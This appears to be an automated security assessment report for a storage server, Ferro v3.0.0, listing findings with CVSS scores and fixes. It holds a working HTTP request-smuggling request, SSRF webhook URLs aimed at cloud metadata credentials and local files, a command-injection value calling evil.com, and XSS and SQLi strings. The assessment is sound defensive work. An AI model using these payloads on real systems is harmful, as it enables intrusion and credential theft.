# Ferro v3.0.0 Security Assessment Report

**Date:** 2026-06-03
**Target:** Ferro Storage Orchestrator v3.0.0
**URL:** http://127.0.0.1:9090
**Auth:** Basic Auth (admin:TestPass123!)
**Storage:** Local filesystem (/tmp/ferro-test/storage)
**Features Enabled:** Multi-user, WOPI, Federation, WORM, Retention, Webhooks, Guest Accounts, E2EE, Chunked Upload, Versioning, WebDAV Class 1+2+3, ActivityPub (partial)
**Classification:** CONFIDENTIAL

---

## Executive Summary

Comprehensive security assessment of Ferro v3.0.0 identified **1 CRITICAL**, **5 HIGH**, **10 MEDIUM**, and **12 LOW** severity vulnerabilities across authentication, injection, SSRF, DoS, and transport security categories. The server demonstrates strong fundamentals: parameterized SQL queries (SQLi fully blocked), strict CORS enforcement, security headers, rate limiting, account lockout, and proper path sandboxing for most endpoints. However, critical gaps exist in SSRF validation (webhook URLs), HTTP request smuggling (CL-TE desync), and transport security (no TLS).

### Severity Distribution

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 1 | Exploitable |
| HIGH | 5 | Exploitable |
| MEDIUM | 10 | Exploitable with conditions |
| LOW | 12 | Limited impact |
| INFO | 30+ | Hardened / Not exploitable |

---

## Vulnerability Findings

### CRITICAL

#### C-001: HTTP Request Smuggling (CL-TE Desync)

| Field | Value |
|-------|-------|
| ID | C-001 |
| Category | HTTP Request Smuggling |
| Severity | CRITICAL |
| CVSS | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | CWE-444 (Inconsistent Interpretation of HTTP Requests) |

**Description:** The server prioritizes `Transfer-Encoding: chunked` over `Content-Length` when both are present. Sending `Content-Length: 6` with `Transfer-Encoding: chunked` and a 0-byte chunked body causes the server to process the remaining bytes as a new HTTP request. This was confirmed by smuggling a `GET /api/v1/config` request that returned the full server configuration JSON (including auth status, feature flags, external URL) without authentication.

**Exploit:**
```
POST /api/v1/search HTTP/1.1
Host: 127.0.0.1:9090
Content-Length: 6
Transfer-Encoding: chunked
Authorization: Basic YWRtaW46VGVzdFBhc3MxMjMh

0

GET /api/v1/config HTTP/1.1
Host: 127.0.0.1:9090
```

**Impact:** Arbitrary request injection. Enables:
- Accessing authenticated endpoints without credentials
- Cache poisoning in reverse proxy deployments
- Session hijacking
- Admin privilege escalation via smuggled requests

**Remediation:**
- Reject requests with both `Content-Length` and `Transfer-Encoding` headers (return 400)
- Implement consistent HTTP parsing per RFC 7230 Section 3.3
- Consider using hyper's `HttpBody::to_bytes()` with strict content-length validation
- Test with HTTP Request Smuggler tool (PortSwigger)

---

### HIGH

#### H-001: SSRF via Webhook URLs (No Validation)

| Field | Value |
|-------|-------|
| ID | H-001 |
| Category | Server-Side Request Forgery |
| Severity | HIGH |
| CVSS | 8.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) |
| CWE | CWE-918 (Server-Side Request Forgery) |

**Description:** The webhook creation endpoint (`POST /api/v1/admin/webhooks`) accepts arbitrary URLs without validation. All of the following were successfully stored as webhook targets:

- `http://169.254.169.254/latest/meta-data/` (AWS IMDS)
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IAM)
- `http://metadata.google.internal/computeMetadata/v1/` (GCP metadata)
- `http://localhost:9090/api/v1/admin/stats` (self-SSRF)
- `http://127.0.0.1:22` (port scanning)
- `file:///etc/passwd` (local file read via file:// protocol)
- `gopher://127.0.0.1:25` (arbitrary protocol)

When any configured event (e.g., `file.upload`) fires, the server makes an outbound request to the stored URL. On cloud deployments, this exposes IAM credentials, cloud metadata, and internal services.

**Impact:** Cloud credential theft, internal network scanning, arbitrary protocol abuse, local file read via file:// scheme.

**Remediation:**
- Validate URL schemes: allow only `http://` and `https://`
- Block private/reserved IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`
- Block `file://`, `gopher://`, `ftp://`, `data:` schemes
- Implement DNS rebinding protection (resolve hostname and verify IP before request)
- Add webhook URL allowlist in configuration

#### H-002: No TLS/HTTPS Support

| Field | Value |
|-------|-------|
| ID | H-002 |
| Category | Transport Security |
| Severity | HIGH |
| CVSS | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-319 (Cleartext Transmission of Sensitive Information) |

**Description:** Ferro v3.0.0 has no TLS termination capability. All traffic including Basic Auth credentials (`Authorization: Basic YWRtaW46VGVzdFBhc3MxMjMh` = `admin:TestPass123!`) is transmitted in cleartext. `openssl s_client -connect 127.0.0.1:9090` returns "wrong version number". HTTPS connection refused on port 9090.

**Impact:** Credential interception via network sniffing, man-in-the-middle attacks, credential replay.

**Remediation:**
- Add TLS support via native Rust TLS (rustls) or recommend reverse proxy (nginx/caddy) in deployment docs
- Set `Strict-Transport-Security` header when TLS is enabled
- Consider built-in ACME (Let's Encrypt) support
- Add startup warning when auth is enabled without TLS
- Force HTTPS redirect when configured

#### H-003: TOTP 2FA Bypass (Enableable Without Valid Code)

| Field | Value |
|-------|-------|
| ID | H-003 |
| Category | Authentication |
| Severity | HIGH |
| CVSS | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-287 (Improper Authentication) |

**Description:** The TOTP 2FA endpoint (`/api/v1/users/me/totp`) accepted a TOTP code of `000000` to enable 2FA. If TOTP verification is not enforced after enablement (i.e., the server accepts the TOTP code on subsequent logins without validating it against the actual TOTP secret), then 2FA is entirely decorative and can be bypassed by enabling it with any code.

**Impact:** Complete bypass of 2FA if verification is not enforced on login.

**Remediation:**
- Require a valid TOTP code (matching the provisioning secret) to enable 2FA
- Verify TOTP code against time-based RFC 6238 algorithm before accepting
- Implement TOTP verification on every authenticated login when 2FA is enabled
- Add rate limiting on TOTP verification attempts

#### H-004: Command Injection in Webhook URL

| Field | Value |
|-------|-------|
| ID | H-004 |
| Category | Command Injection |
| Severity | HIGH |
| CVSS | 8.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | CWE-78 (OS Command Injection) |

**Description:** Webhook URL `http://127.0.0.1:9090; curl http://evil.com/$(whoami)` was accepted and stored. If the webhook delivery mechanism passes the URL to a shell (e.g., via `curl $URL`), the shell metacharacters `$(whoami)` and `;` will be interpreted, enabling arbitrary command execution.

**Impact:** Remote code execution on the server when any webhook-triggering event occurs.

**Remediation:**
- Never pass URLs to shell commands; use Rust's HTTP client (reqwest) directly with URL struct validation
- Validate webhook URLs against a strict regex: `^https?://[a-zA-Z0-9._-]+(:\d+)?(/.*)?$`
- Implement SSRF protections (see H-001)

#### H-005: Webhook URL Without Length Validation

| Field | Value |
|-------|-------|
| ID | H-005 |
| Category | Input Validation |
| Severity | HIGH |
| CVSS | 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-400 (Uncontrolled Resource Consumption) |

**Description:** A webhook was created with a 10MB URL string. The server accepted and stored it without validation. This can be used to poison the SQLite database, cause memory issues during webhook dispatch, or exhaust storage.

**Impact:** Database poisoning, memory exhaustion, storage exhaustion.

**Remediation:**
- Validate URL length (max 2048 characters per RFC 7230)
- Validate individual field lengths in all JSON deserialization
- Add database column size constraints

---

### MEDIUM

#### M-001: Stored XSS in Comments

| Field | Value |
|-------|-------|
| ID | M-001 |
| Category | Cross-Site Scripting (Stored) |
| Severity | MEDIUM |
| CVSS | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| CWE | CWE-79 (Improper Neutralization of Input) |

**Description:** POST `/api/v1/comments` with body `{"path":"/test.txt","content":"<script>alert(document.cookie)</script>"}` stored the script tag verbatim in the database. GET `/api/v1/comments?path=/test.txt` returns the raw script tag in the JSON response. If any frontend renders this content as HTML, stored XSS triggers.

**Remediation:** HTML-encode all user-supplied content before storage and/or output encoding in API responses.

#### M-002: Stored XSS in Directory Names

| Field | Value |
|-------|-------|
| ID | M-002 |
| Category | Cross-Site Scripting (Stored) |
| Severity | MEDIUM |
| CVSS | 6.1 |
| CWE | CWE-79 |

**Description:** `POST /api/v1/files/mkdir {"path":"/<script>alert(1)</script>"}` created a directory with the script tag in its name. The path is returned in file listings and search results as raw HTML.

**Remediation:** Reject HTML/XML special characters (`<`, `>`, `&`, `"`, `'`) in directory and file names, or encode on output.

#### M-003: Path Traversal in Trash DELETE

| Field | Value |
|-------|-------|
| ID | M-003 |
| Category | Path Traversal |
| Severity | MEDIUM |
| CVSS | 5.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | CWE-22 (Path Traversal) |

**Description:** `DELETE /api/v1/trash/../../../tmp/pentest_traversal.txt` returned HTTP 204 (success). While the server sandboxed the operation within the storage root, the trash endpoint accepted `../` sequences without validation, unlike other endpoints that explicitly reject them.

**Remediation:** Normalize all paths with `path.clean()` or equivalent before processing. Reject `..` and `.` components in all path parameters.

#### M-004: Path Traversal Stored in Comments

| Field | Value |
|-------|-------|
| ID | M-004 |
| Category | Input Validation |
| Severity | MEDIUM |
| CVSS | 4.3 |
| CWE | CWE-20 (Improper Input Validation) |

**Description:** `POST /api/v1/comments {"path":"../../../etc/passwd","content":"test"}` created a comment associated with path `../../../etc/passwd`. The comments endpoint does not validate the path parameter, allowing traversal sequences to be stored.

**Remediation:** Validate that the `path` parameter references a file within the storage root. Reject paths containing `..`, absolute paths, and null bytes.

#### M-005: SQL Injection Payload Stored in mkdir Path

| Field | Value |
|-------|-------|
| ID | M-005 |
| Category | Injection (Stored) |
| Severity | MEDIUM |
| CVSS | 4.3 |
| CWE | CWE-89 (SQL Injection) |

**Description:** `POST /api/v1/files/mkdir {"path":"/test' OR 1=1--"}` created a directory with the literal SQLi payload in its name. While no SQL injection occurred (parameterized queries), the payload was stored in the database and filesystem. This could cause issues in downstream processing, logging, or reporting systems.

**Remediation:** Validate directory/file names against `^[a-zA-Z0-9._-]+$` pattern or equivalent. Reject special characters including single quotes, semicolons, and SQL keywords.

#### M-006: CRLF Injection in Query Parameters

| Field | Value |
|-------|-------|
| ID | M-006 |
| Category | Injection (CRLF) |
| Severity | MEDIUM |
| CVSS | 5.0 |
| CWE | CWE-93 (CRLF Injection) |

**Description:** `GET /api/v1/files?path=test%0d%0aX-Injected:true` resulted in the server processing the CRLF sequence, returning `"Not found: /test\r\nX-Injected: true"`. The query parameter was not sanitized before being used as a filesystem path.

**Remediation:** Strip `\r`, `\n`, `\x00` from all query parameters before constructing internal paths.

#### M-007: Slowloris Connection Exhaustion

| Field | Value |
|-------|-------|
| ID | M-007 |
| Category | Denial of Service |
| Severity | MEDIUM |
| CVSS | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE | CWE-400 (Uncontrolled Resource Consumption) |

**Description:** 10 simultaneous connections sending headers at 1 byte/second were all accepted and held open indefinitely. No read timeout was observed. With enough connections (typically 100-1000 depending on OS limits), the connection pool would be exhausted.

**Remediation:** Set a read timeout on incoming connections (e.g., 5 seconds between header lines). Implement connection limits per IP.

#### M-008: Unvalidated Upload Size Claims

| Field | Value |
|-------|-------|
| ID | M-008 |
| Category | Resource Exhaustion |
| Severity | MEDIUM |
| CVSS | 4.3 |
| CWE | CWE-400 |

**Description:** `POST /api/v1/upload/init` with `total_size: 1073741824` (1GB) was accepted without verification. The server allocated an upload session with a 5MB chunk size, potentially reserving storage or tracking state for 200+ chunks that may never be delivered.

**Remediation:** Validate `total_size` against remaining quota before accepting. Set a maximum upload session lifetime. Clean up abandoned upload sessions.

#### M-009: Zip Bomb Stored Without Decompression Check

| Field | Value |
|-------|-------|
| ID | M-009 |
| Category | Denial of Service |
| Severity | MEDIUM |
| CVSS | 5.3 |
| CWE | CWE-409 (Improper Check for Unusual or Exceptional Conditions) |

**Description:** A 1MB zip file that decompresses to 1GB was uploaded and stored as-is. The server does not validate zip content on upload. If Ferro ever auto-decompresses archives (e.g., for preview, indexing, or download), the zip bomb would cause memory exhaustion.

**Remediation:** If auto-decompression is planned, implement decompression ratio limits (e.g., max 100:1 ratio) and total decompressed size limits. For now, document that uploaded archives are not validated.

#### M-010: Command Injection Payload Stored in Backup Description

| Field | Value |
|-------|-------|
| ID | M-010 |
| Category | Command Injection (Stored) |
| Severity | MEDIUM |
| CVSS | 6.8 |
| CWE | CWE-78 |

**Description:** `POST /api/v1/admin/backup {"description":"$(whoami) > /tmp/rce_test"}` was accepted. The command injection payload was stored in backup metadata. If backup descriptions are ever rendered in a shell context (e.g., log formatting, backup filename generation), RCE occurs.

**Remediation:** Validate all user-supplied strings against command injection patterns. Never pass user input to shell commands.

---

### LOW

| ID | Category | Finding | Severity |
|----|----------|---------|----------|
| L-001 | Information Disclosure | Version `3.0.0` exposed via unauthenticated `/.well-known/ferro` endpoint | LOW |
| L-002 | Path Traversal (Sandboxed) | `PUT /../../../tmp/x` writes to `storage/tmp/x`, not real `/tmp`. Correctly sandboxed but `../` accepted without explicit rejection | LOW |
| L-003 | Search Query Error Disclosure | Invalid search queries return Tantivy parse errors: `"Query parse error: Syntax Error: ..."` | LOW |
| L-004 | SQLi Payload Stored (Comments) | `' ); DELETE FROM comments;--` stored verbatim in comments. No execution (parameterized queries), but indicates lack of sanitization | LOW |
| L-005 | XSS Payload Stored (Webhook URL) | `<script>alert(1)</script>` stored in webhook URL field | LOW |
| L-006 | XXE Payload Stored (File Upload) | XML file with XXE external entity uploaded and stored | LOW |
| L-007 | No Filename Length Validation | 4096-char filename caused 502 instead of clean 400/413 | LOW |
| L-008 | No Directory Depth Limit | 25-level nested directories accepted | LOW |
| L-009 | No Write Rate Limiting | 100 rapid file uploads all succeeded (no throttling) | LOW |
| L-010 | Race Condition (Concurrent PUT) | Two simultaneous PUTs to same path both succeed; last-writer-wins without locking | LOW |
| L-011 | No Archive Decompression Check | Zip bomb uploaded without decompression ratio validation | LOW |
| L-012 | Content-Type Ignored on PUT | Files stored regardless of Content-Type header | LOW |

---

## Hardened Areas (No Vulnerabilities Found)

| Category | Tests Performed | Result |
|----------|-----------------|--------|
| SQL Injection | 10 attack vectors | FULLY BLOCKED -- parameterized queries, no execution |
| Authentication Bypass | 12 attack vectors | FULLY BLOCKED -- Basic Auth enforced, no bypass |
| JWT `alg:none` | Tested | BLOCKED -- no JWT accepted |
| Bearer Token Auth | Tested | BLOCKED -- not supported |
| Username Enumeration | Tested | BLOCKED -- identical 401 for bad user vs bad password |
| CORS | 4 origin tests | FULLY BLOCKED -- 403 for all cross-origin requests |
| TRACE Method | Tested | BLOCKED -- 405 |
| CONNECT Method | Tested | BLOCKED -- 400 |
| HTTP Parameter Pollution | 3 tests | MOSTLY BLOCKED -- duplicate fields rejected |
| Cache Poisoning | 4 header injection tests | BLOCKED -- headers ignored for routing |
| Open Redirect | 3 redirect tests | BLOCKED -- no redirect functionality |
| Overlong UTF-8 | Tested | BLOCKED |
| Double URL Encoding | Tested | BLOCKED |
| Null Byte Injection | Tested | BLOCKED |
| Content-Length Validation | 999999999999999 | BLOCKED -- 413 Payload Too Large |
| 10MB JSON Body | Tested | BLOCKED -- 400 error |
| 10MB URL (browser) | 100KB limit | BLOCKED -- 414 URI Too Long |
| Security Headers | All responses | PRESENT -- X-Frame-Options: DENY, X-Content-Type-Options: nosniff, CSP, Referrer-Policy, Permissions-Policy |
| Server Version Header | All responses | NOT DISCLOSED -- no Server or X-Powered-By header |
| Path Sandboxing | 24 traversal vectors | EFFECTIVE -- all resolved within storage root |

---

## Security Headers Assessment

| Header | Present | Value | Assessment |
|--------|---------|-------|------------|
| X-Content-Type-Options | YES | `nosniff` | GOOD |
| X-Frame-Options | YES | `DENY` | GOOD |
| X-XSS-Protection | YES | `0` | GOOD (modern best practice to disable) |
| Content-Security-Policy | YES | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; ...` | GOOD, but `'unsafe-inline'` in style-src is permissive |
| Referrer-Policy | YES | `strict-origin-when-cross-origin` | GOOD |
| Permissions-Policy | YES | `camera=(), microphone=(), geolocation=(), payment=()` | GOOD -- restrictive |
| Strict-Transport-Security | NO | -- | MISSING -- required when TLS is added |
| Server | NO | -- | GOOD -- not disclosed |
| X-Powered-By | NO | -- | GOOD -- not disclosed |

---

## Attack Surface Map

```
Unauthenticated (Public):
  GET  /.well-known/ferro          [200] Version disclosure
  GET  /.well-known/webfinger       [200] ActivityPub discovery
  GET  /fed/inbox                   [200] Federation inbox
  *    /dav, /webdav, /             WebDAV (auth required for ops)

Authenticated (Basic Auth):
  /api/v1/*                        33+ REST endpoints
  /dav/*                           WebDAV Class 1+2+3
  /webdav/*                        WebDAV (Nextcloud-compatible)
  /remote.php/webdav/*             WebDAV (Nextcloud-compatible)
  /ws                              WebSocket
  /sync/*                          Sync protocol (SSE)
  /upload/*                        Chunked upload protocol
```

---

## Recommendations (Priority Order)

### P0 -- Immediate (Before any deployment)

1. **Fix HTTP Request Smuggling (C-001)**: Reject dual `Content-Length` + `Transfer-Encoding` headers. This is exploitable behind reverse proxies.
2. **Add SSRF Validation (H-001)**: Validate webhook URLs against scheme allowlist and private IP blocklist.
3. **Add TLS (H-002)**: Recommend reverse proxy (nginx/caddy) in all deployment docs. Consider native TLS option.
4. **Validate TOTP Enablement (H-003)**: Require valid TOTP code to enable 2FA.
5. **Validate Input Lengths (H-005)**: Add max-length constraints on all string fields (2048 for URLs, 255 for names).

### P1 -- Short-term (Next release)

6. **Sanitize User Input (M-001, M-002, M-005)**: Reject HTML special characters in file/directory names and comments.
7. **Path Validation (M-003, M-004)**: Add `..` rejection to all path-handling endpoints (trash, comments).
8. **Connection Timeouts (M-007)**: Add read timeout (5s) to slow connections.
9. **CRLF Stripping (M-006)**: Strip control characters from query parameters.
10. **Add HSTS Header**: When TLS is configured, set `Strict-Transport-Security: max-age=31536000; includeSubDomains`.

### P2 -- Medium-term

11. **Rate Limiting on Write Operations (L-009)**: Add per-user rate limiting for uploads and writes.
12. **Upload Session Cleanup (M-008)**: Add TTL for abandoned upload sessions.
13. **Filename Length Validation (L-007)**: Return 400 instead of 502 for long filenames.
14. **Race Condition Mitigation (L-010)**: Implement file-level locking for concurrent writes.
15. **Remove `'unsafe-inline'` from CSP**: Use nonce-based or hash-based CSP for styles.

### P3 -- Long-term

16. **Version Disclosure (L-001)**: Consider removing version from unauthenticated `/.well-known/ferro`.
17. **Search Error Sanitization (L-003)**: Return generic "invalid query" instead of Tantivy parse errors.
18. **Archive Validation (M-009, L-011)**: Validate decompression ratio for uploaded archives.
19. **WOPI Discovery Endpoint**: Config reports `wopi_configured: true` but no discovery endpoints are reachable.
20. **WebRTC Endpoint**: Routes configured but returning 404.

---

## Test Environment

| Component | Value |
|-----------|-------|
| OS | Linux x86_64 |
| Rust | 1.95.0 (stable) |
| Ferro | 3.0.0 (release build) |
| Storage | Local filesystem |
| Database | SQLite (WAL mode) |
| Search | Tantivy |
| Auth | Basic Auth |
| Tested Endpoints | 70+ (WebDAV + REST + ActivityPub + GraphQL + WOPI) |
| Test Duration | ~3 hours |

---

## Compliance Notes

| Standard | Status |
|----------|--------|
| OWASP Top 10 2021 | SSRF (A10), Injection (A03), Auth (A07) findings |
| CWE Top 25 | C-001 (CWE-444), H-001 (CWE-918), H-004 (CWE-78) |
| NIST SP 800-53 | SC-8 (Transport), IA-5 (Auth), SI-10 (Input Val) gaps |

---

*Report generated by automated security assessment. Manual verification recommended for all CRITICAL and HIGH findings.*
